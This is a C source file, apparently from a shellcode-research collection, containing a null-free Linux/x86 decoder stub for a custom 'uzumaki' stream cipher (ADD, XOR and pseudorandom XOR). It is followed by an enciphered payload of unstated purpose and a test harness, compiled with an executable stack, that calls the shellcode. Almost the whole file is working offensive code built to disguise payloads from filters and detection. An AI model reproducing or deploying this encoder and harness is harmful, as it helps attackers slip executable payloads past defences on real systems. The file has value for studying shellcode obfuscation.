/*

 Uzumaki Decipher Shellcode - C Language - Linux/x86
 Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/

/*

   uzumaki_decipher_shellcode

  * decipher has 29 bytes (the final amount depends on the shellcode length)
  * it deciphers the uzumaki algorithm, a custom stream cipher algorithm ( ADD [static], XOR [static] and XOR [pseudorandom] )
  * null-free


   # gcc -m32 -fno-stack-protector -z execstack uzumaki_decipher_shellcode.c -o uzumaki_decipher_shellcode

   Testing
   # ./uzumaki_decipher_shellcode

*/


#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \

// Shellcode Decipher
"\x29\xc9\x74\x14\x5e\xb1"
"\x14"  // <- shellcode length
"\x46\x8b\x06\x83\xe8"
"\x09"  // <- ADD key
"\x34"
"\x9f"  // <- XOR key
"\x32\x46\xff\x88\x06\xe2\xf1\xeb\x05\xe8"
"\xe7\xff\xff\xff"

// Ciphed Shellcode
"\x31\x70\xaa\x92\xd7\x2d\xce\xaf\xe1\xa8"
"\xcc\x8d\xa8\xe1\xdb\x9d\xa1\x81\xfe\xba"
"\xdb";


main ()
{

        // When contains null bytes, printf will show a wrong shellcode length.

	printf("Shellcode Length:  %d\n", strlen(shellcode));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ ("movl $0xffffffff, %eax\n\t"
		 "movl %eax, %ebx\n\t"
		 "movl %eax, %ecx\n\t"
		 "movl %eax, %edx\n\t"
		 "movl %eax, %esi\n\t"
		 "movl %eax, %edi\n\t"
		 "movl %eax, %ebp\n\t"

		 // Calling the shellcode
		 "call shellcode");

}
